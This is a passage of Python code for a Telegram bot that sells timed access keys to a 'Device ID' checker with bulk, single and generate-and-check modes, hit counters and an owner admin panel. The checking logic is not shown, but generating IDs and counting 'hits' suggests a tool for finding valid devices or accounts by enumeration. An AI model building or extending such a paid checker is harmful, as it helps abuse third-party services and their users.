                    st.get("total_checked", 0), st.get("total_hits", 0)),
                reply_markup=kb_main(admin=is_admin))
            return

        if uid != OWNER_ID:
            ok, _ = await check_membership(ctx.bot, uid)
            if not ok:
                await safe_edit(q, render_join(update.effective_user.first_name or "there"),
                    reply_markup=kb_join())
                return

        if data == "tool_bulk":
            auth, r = await user_manager.is_authorized(uid)
            if not auth: await safe_edit(q, f"🚫 Access denied: `{r}`"); return
            with job_lock:
                if uid not in active_jobs: active_jobs[uid] = {}
                active_jobs[uid]["awaiting_bulk_file"] = True
            await safe_edit(q,
                f"📤 *BULK CHECK MODE*\n{LINE_HEAVY}\n"
                "Send a `.txt` file — one Device ID per line.\n"
                f"{LINE_HEAVY}\n👑 {BRAND}",
                reply_markup=kb_back(is_admin)); return

        if data == "tool_single":
            auth, r = await user_manager.is_authorized(uid)
            if not auth: await safe_edit(q, f"🚫 Access denied: `{r}`"); return
            with job_lock:
                if uid not in active_jobs: active_jobs[uid] = {}
                active_jobs[uid]["awaiting_single_device"] = True
            await safe_edit(q,
                f"🔍 *SINGLE CHECK MODE*\n{LINE_HEAVY}\n"
                "Send one Device ID as text.\n"
                f"{LINE_HEAVY}\n👑 {BRAND}",
                reply_markup=kb_back(is_admin)); return

        if data == "tool_generate":
            auth, r = await user_manager.is_authorized(uid)
            if not auth: await safe_edit(q, f"🚫 Access denied: `{r}`"); return
            threads = await user_manager.get_threads_limit(uid)
            with job_lock:
                if uid not in active_jobs: active_jobs[uid] = {}
                active_jobs[uid]["awaiting_gen_count"] = True
                active_jobs[uid]["gen_threads"] = threads
            await safe_edit(q,
                f"🎲 *GENERATE + CHECK*\n{LINE_HEAVY}\n"
                f"┣ 🧵 Threads : `{threads}`\n"
                f"┣ 🔢 Range   : `1 - {MAX_GENERATE_COUNT:,}`\n"
                f"┗ 📝 Action  : send a number\n{LINE_HEAVY}\n👑 {BRAND}",
                reply_markup=kb_back(is_admin)); return

        if data == "tool_stats":
            ui = await user_manager.get_user_info(uid) or {}
            st = ui.get("stats", {})
            await safe_edit(q,
                f"◇ *YOUR STATS* ◇\n{LINE_HEAVY}\n"
                f"┣ 🔍 Checked : `{st.get('total_checked', 0):,}`\n"
                f"┗ 🎯 Hits    : `{st.get('total_hits', 0):,}`\n{LINE_HEAVY}\n👑 {BRAND}",
                reply_markup=kb_back(is_admin)); return

        if data == "menu_buy":
            await safe_edit(q,
                f"💳 *GET ACCESS*\n{LINE_HEAVY}\n"
                "┣ 3 Days     · ₱50\n┣ 7 Days     · ₱70\n"
                "┣ 1 Month    · ₱100\n┗ Lifetime   · ₱150\n"
                f"{LINE_HEAVY}\n📩 {BRAND}",
                reply_markup=kb_back(is_admin)); return

        if data == "menu_help":
            await safe_edit(q,
                f"◇ *HELP* ◇\n{LINE_HEAVY}\n"
                "┣ 🔥 Bulk Check — `.txt` file\n"
                "┣ 🔍 Single Check — one ID\n"
                "┣ 🎲 Generate + Check\n"
                "┣ 📊 Statistics\n\n"
                "`/redeem` · `/start` · `/stop`\n"
                f"{LINE_HEAVY}\n👑 {BRAND}",
                reply_markup=kb_back(is_admin)); return

        if data.startswith("stop_"):
            try: target = int(data.split("_")[1])
            except Exception: return
            if uid == target or uid == OWNER_ID:
                with job_lock:
                    if target in active_jobs:
                        active_jobs[target]["stopped"] = True
                        ev = active_jobs[target].get("stop_event")
                        if ev: ev.set()
                await safe_edit(q, "🛑 Stopped.", reply_markup=kb_back(is_admin))
            return

        if data == "open_admin":
            if uid != OWNER_ID:
                await q.answer("Admin only", show_alert=True); return
            await safe_edit(q, f"◇ *ADMIN PANEL* ◇\n{LINE_HEAVY}", reply_markup=kb_admin()); return

        if data == "adm_running":
            if uid != OWNER_ID: return
            with job_lock:
                running = [(k, dict(v)) for k, v in active_jobs.items()
                           if v.get("status") == "running" and "stats" in v]
            if not running:
                await safe_edit(q, "No active jobs.", reply_markup=kb_back(True)); return
            lines = [f"⚡ *RUNNING JOBS*\n{LINE_HEAVY}"]
            for r_uid, rj in running:
                s = rj["stats"].snapshot()
                mode = rj.get("mode", "bulk")
                lines.append(f"`{r_uid}` [{mode}] — ✅{s['hits']} 🚫{s['invalid']} ❌{s['errors']} ({s['checked']}/{s['total']})")
            await safe_edit(q, "\n".join(lines), reply_markup=kb_back(True)); return

        if data == "adm_stats":
            if uid != OWNER_ID: return
            await cmd_stats(update, ctx); return

        if data == "adm_users":
            if uid != OWNER_ID: return
            users = await user_manager.get_all_users()
            lines = [f"👥 *Users ({len(users)})*", LINE_HEAVY]
            for u, i in list(users.items())[:30]:
                lines.append(f"`{u}` | exp={(i.get('key_expiry') or '—')[:10]}")
            await safe_edit(q, "\n".join(lines), reply_markup=kb_back(True)); return

        if data == "adm_genkey":
            if uid != OWNER_ID: return
            await safe_edit(q, "Use `/genkey hours 24 1`", reply_markup=kb_back(True)); return

        await safe_edit(q, f"⚠️ Unknown action: `{data}`", reply_markup=kb_back(is_admin))

    except Exception:
        try: await q.answer("Error.", show_alert=True)
        except Exception: pass

# ────────────────────────────────────────────────────────────────
# POST_INIT + MAIN
# ────────────────────────────────────────────────────────────────

async def post_init(app):
    cmds = [
        BotCommand("start", "Dashboard"),
        BotCommand("redeem", "Redeem key"),
        BotCommand("stop", "Stop current job"),
        BotCommand("status", "Job status"),
        BotCommand("help", "Help"),
    ]
    await app.bot.set_my_commands(cmds)
    if OWNER_ID:
        await app.bot.set_my_commands(cmds + [
            BotCommand("admin", "Admin panel"),
            BotCommand("genkey", "Generate key"),
            BotCommand("ban_user", "Ban user"),
            BotCommand("unban_user", "Unban user"),
            BotCommand("stats", "Statistics"),
        ], scope={"type": "chat", "chat_id": OWNER_ID})

def main():
    req = HTTPXRequest(connect_timeout=TELEGRAM_CONNECT_TIMEOUT, read_timeout=TELEGRAM_READ_TIMEOUT,
                      write_timeout=TELEGRAM_WRITE_TIMEOUT, pool_timeout=TELEGRAM_POOL_TIMEOUT)
    app = Application.builder().token(BOT_TOKEN).request(req).post_init(post_init).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(CommandHandler("genkey", cmd_genkey))
    app.add_handler(CommandHandler("ban_user", cmd_ban_user))
    app.add_handler(CommandHandler("unban_user", cmd_unban_user))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_handler(CallbackQueryHandler(handle_callback))

    try:
        app.run_polling(bootstrap_retries=10, allowed_updates=Update.ALL_TYPES,
                        drop_pending_updates=False)
    except NetworkError:
        time.sleep(5); main()
    except Exception:
        sys.exit(1)

if __name__ == "__main__":
    main()